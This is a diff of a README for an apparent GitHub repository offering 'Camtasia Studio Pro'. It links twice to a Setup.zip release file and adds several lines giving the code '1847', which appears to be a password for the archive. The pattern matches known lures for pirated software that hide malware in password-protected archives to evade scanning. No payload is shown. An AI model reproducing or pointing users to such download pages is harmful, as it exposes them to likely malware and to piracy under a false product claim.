@@ -9,6 +9,11 @@
 ---
 
 [![Camtasia Studio](og-image.png)](https://github.com/Highwaypiaura/Camtasia-Studio/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
@@ -23,6 +28,11 @@
 ## Download & Get Pro
 
 [![Get Camtasia Studio Pro](https://img.shields.io/badge/Get%20Camtasia%20Studio%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/Highwaypiaura/Camtasia-Studio/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
